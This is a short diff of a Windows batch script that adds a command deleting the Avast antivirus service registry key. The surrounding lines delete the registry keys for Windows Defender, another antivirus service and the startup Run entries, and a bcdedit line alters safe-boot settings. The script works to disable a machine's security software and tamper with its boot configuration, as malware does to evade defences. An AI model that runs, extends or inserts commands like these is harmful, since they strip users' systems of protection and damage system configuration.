@@ -151,6 +151,7 @@ bcdedit /deletevalue {current} safeboot
 :: Delete registry keys related to antivirus services
 echo Deleting registry keys...
 reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /f
+reg delete "HKLM\SYSTEM\CurrentControlSet\Services\avast! Antivirus" /f
 reg delete "HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" /f
 reg delete "HKLM\SYSTEM\ControlSet001\Services\WinDefend" /f
 reg delete "HKLM\SYSTEM\CurrentControlSet\Services\AVP21.3" /f
